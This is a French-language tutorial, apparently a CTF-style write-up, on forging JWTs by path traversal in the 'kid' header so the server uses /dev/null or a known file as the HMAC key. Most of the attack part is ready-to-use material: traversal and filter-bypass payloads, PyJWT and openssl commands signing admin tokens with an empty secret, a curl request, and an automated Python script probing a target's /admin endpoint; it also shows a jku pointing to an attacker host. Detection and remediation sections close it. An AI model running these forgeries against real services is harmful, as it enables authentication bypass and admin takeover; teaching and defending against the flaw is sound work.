# 📂 Path Traversal dans le paramètre `kid` (JWT)

> **Auteur :** [@spectramz](https://github.com/exploit4040) — *"Le roi des pirates"* 🏴‍☠️
> **Catégorie :** Web Exploitation — Cryptographie
> **Difficulté :** ⭐⭐⭐☆☆
> **Tags :** `jwt`, `kid`, `path-traversal`, `lfi`, `null-byte`

---

## 📌 Table des matières

- [Contexte](#-contexte)
- [Principe de l'attaque](#-principe-de-lattaque)
- [Prérequis](#-prérequis)
- [Exploitation pas à pas](#-exploitation-pas-à-pas)
- [Variantes](#-variantes)
- [Script Python automatisé](#-script-python-automatisé)
- [Détection](#-détection)
- [Remédiation](#-remédiation)
- [Références](#-références)

---

## 🎯 Contexte

Le paramètre **`kid`** (Key ID) du header JWT permet au serveur de savoir **quelle clé utiliser** pour vérifier la signature. Sa valeur est libre : elle peut être un UUID, un nom de fichier, un chemin, etc.

Dans certaines implémentations naïves, le `kid` est utilisé pour construire un **chemin de fichier** :

```python
key_path = os.path.join("keys", kid + ".pem")
with open(key_path, "rb") as f:
    key = f.read()


Si le kid n'est pas validé, un attaquant peut :

    Path Traversal : pointer vers un fichier arbitraire (/etc/passwd, /dev/null…)

    Null Byte : tronquer le chemin (../../etc/passwd%00)

    Fichier connu : utiliser un fichier dont il connaît le contenu comme clé HMAC

🧠 Principe de l'attaque
Exploitation via /dev/null

/dev/null est un fichier vide sur tous les systèmes Unix. Si le kid pointe vers ce fichier, la clé HMAC devient une chaîne vide. On peut donc signer le token avec un secret vide.

Header forgé :
json

{
  "alg": "HS256",
  "kid": "../../../../../../dev/null",
  "typ": "JWT"
}

Signature : calculée avec secret = "".
Exploitation via fichier connu

Si on peut pointer vers un fichier dont on connaît le contenu (par exemple, un fichier accessible publiquement), on peut utiliser ce contenu comme clé HMAC.

Exemples :

    ../../../../etc/hostname

    ../../../../var/www/html/index.php (si on connaît son contenu)

    ../../../../tmp/known.txt (fichier qu'on a uploadé)

📋 Prérequis

    Un JWT valide

    Le paramètre kid présent dans le header

    Une bibliothèque JWT côté serveur qui utilise le kid pour construire un chemin

    Python avec pyjwt (pip install pyjwt)

🛠️ Exploitation pas à pas
Étape 1 — Décoder le header
bash

echo "eyJhbGciOiJIUzI1NiIsImtpZCI6ImI5MDFiYjI0LTcwMGItNGNjNi1hNzFhLWNiMjA3YWI2MTMxMyIsInR5cCI6IkpXVCJ9" | base64 -d

Résultat :
json

{
  "alg": "HS256",
  "kid": "b901bb24-700b-4cc6-a71a-cb207ab61313",
  "typ": "JWT"
}

Étape 2 — Tester le Path Traversal

Modifier le kid pour pointer vers /dev/null :
json

{
  "alg": "HS256",
  "kid": "../../../../../../dev/null",
  "typ": "JWT"
}

Tester différentes profondeurs :
text

"kid": "../dev/null"
"kid": "../../dev/null"
"kid": "../../../dev/null"
"kid": "../../../../dev/null"
"kid": "../../../../../dev/null"
"kid": "../../../../../../dev/null"

Étape 3 — Contourner les filtres ../

Si le serveur filtre ../, utiliser la double écriture :
Payload	Après filtre
....//	../
....\/	../
..%2f	../ (si décodé)
%2e%2e%2f	../ (si décodé)

Exemple :
json

{
  "kid": "....//....//....//....//....//dev/null"
}

Après suppression des ../ :
text

../../../../dev/null

Étape 4 — Forger le token avec un secret vide

Avec Python (PyJWT) :
python

import jwt

header = {
    "alg": "HS256",
    "kid": "....//....//....//....//....//dev/null",
    "typ": "JWT"
}

payload = {
    "user": "admin",
    "role": "admin"
}

# Signature avec secret vide
token = jwt.encode(payload, "", algorithm="HS256", headers=header)
print(token)

Note : jwt.io refuse les secrets vides. Il faut utiliser PyJWT ou openssl.

Avec openssl :
bash

HEADER=$(echo -n '{"alg":"HS256","kid":"....//....//....//....//....//dev/null","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"user":"admin","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
SIGNATURE=$(echo -n "$HEADER.$PAYLOAD" | openssl dgst -sha256 -hmac "" -binary | base64 -w0 | tr '+/' '-_' | tr -d '=')
echo "$HEADER.$PAYLOAD.$SIGNATURE"

Étape 5 — Envoyer le token
bash

curl http://<cible>/admin \
  -H "Authorization: Bearer <FORGED_TOKEN>"

Réponse attendue : 200 OK avec les données admin.
🤖 Script Python automatisé
python

#!/usr/bin/env python3
"""
Exploitation du paramètre kid par Path Traversal.
Auteur : SpectraMz
"""
import jwt
import requests
import sys
import json
import base64
import hmac
import hashlib

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def forge_token(kid: str, payload: dict, secret: str = "") -> str:
    """Forge un JWT HS256 avec un kid arbitraire."""
    header = {"alg": "HS256", "kid": kid, "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()

    signature = hmac.new(
        secret.encode(),
        signing_input,
        hashlib.sha256
    ).digest()
    sig_b64 = b64url_encode(signature)

    return f"{header_b64}.{payload_b64}.{sig_b64}"

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <TARGET_URL>")
        sys.exit(1)

    target = sys.argv[1].rstrip("/")

    # Différents payloads à tester
    kids = [
        "../dev/null",
        "../../dev/null",
        "../../../dev/null",
        "../../../../dev/null",
        "../../../../../dev/null",
        "../../../../../../dev/null",
        "....//....//....//....//....//dev/null",
        "....//....//....//....//....//....//dev/null",
    ]

    payload = {"user": "admin", "role": "admin", "admin": True}

    for kid in kids:
        try:
            token = forge_token(kid, payload, secret="")
            r = requests.get(
                f"{target}/admin",
                headers={"Authorization": f"Bearer {token}"},
                timeout=10
            )
            status = r.status_code
            marker = "✅" if status == 200 else "❌"
            print(f"{marker} kid={kid:50} → {status}")
            if status == 200:
                print(f"   Réponse : {r.text[:200]}")
                print(f"   Token   : {token}")
                break
        except Exception as e:
            print(f"❌ kid={kid} → Erreur : {e}")

if __name__ == "__main__":
    main()

Utilisation :
bash

python3 kid_traversal.py http://target.com

🔄 Variantes
Variante 1 — Null Byte

Certains serveurs tronquent le chemin au premier \x00 :
text

"kid": "../../etc/passwd%00"
"kid": "../../etc/passwd\x00"

Note : le null byte est bloqué depuis PHP 5.3.4, mais reste exploitable dans d'autres langages.
Variante 2 — Fichier connu

Si on peut uploader un fichier et connaître son chemin, on peut l'utiliser comme clé HMAC :
json

{
  "kid": "../../../../tmp/upload/known.txt"
}

On signe alors avec le contenu de ce fichier comme secret.
Variante 3 — /proc/self/environ

Sur Linux, /proc/self/environ contient les variables d'environnement du processus. Si on connaît son contenu, on peut l'utiliser comme clé.
Variante 4 — Path Traversal dans jku / x5u

Les paramètres jku (JWK Set URL) et x5u (X.509 URL) peuvent aussi être vulnérables au SSRF/Path Traversal :
json

{
  "jku": "http://attaquant.com/malicious-jwks.json"
}

Le serveur va chercher les clés à cette URL et les utiliser pour vérifier la signature.
🔍 Détection
Côté serveur

    Alerter si le kid contient .., /, \, %00

    Journaliser les valeurs de kid reçues

    Vérifier que le chemin résolu reste dans le répertoire autorisé

Côté attaquant

    Tester plusieurs profondeurs de ../

    Tester les variantes de contournement (....//, ..%2f)

    Tester /dev/null, /etc/passwd, /proc/self/environ

🛡️ Remédiation
Code vulnérable
python

# ❌ Utilise directement le kid comme chemin
kid = header["kid"]
key_path = os.path.join("keys", kid + ".pem")
with open(key_path, "rb") as f:
    key = f.read()

Code sécurisé
python

# ✅ Liste blanche de kid autorisés
ALLOWED_KIDS = {
    "key1": "keys/key1.pem",
    "key2": "keys/key2.pem",
    "key3": "keys/key3.pem",
}

kid = header.get("kid")
if kid not in ALLOWED_KIDS:
    raise ValueError(f"kid invalide : {kid}")

key_path = ALLOWED_KIDS[kid]

# ✅ Vérification supplémentaire du chemin réel
real_path = os.path.realpath(key_path)
real_base = os.path.realpath("keys")
if not real_path.startswith(real_base):
    raise ValueError("Path traversal détecté")

Règles d'or
Règle	Détail
Liste blanche	Toujours valider le kid contre une liste connue
Ne jamais construire un chemin	Ne pas utiliser le kid comme nom de fichier
realpath()	Vérifier le chemin résolu
Interdire ..	Bloquer .., /, \, %00
Filtrer les URLs	Ne pas accepter de jku/x5u externes
📚 Références

    Hacking JSON Web Tokens — Rudra Pratap

    Attacking JWT Authentication — Sjoerd Langkemper

    CWE-22 — Path Traversal

    PortSwigger — JWT kid header injection

<p align="center"> <b>🏴‍☠️ SpectraMz — Stay Curious, Hack Ethically</b> </p> ```
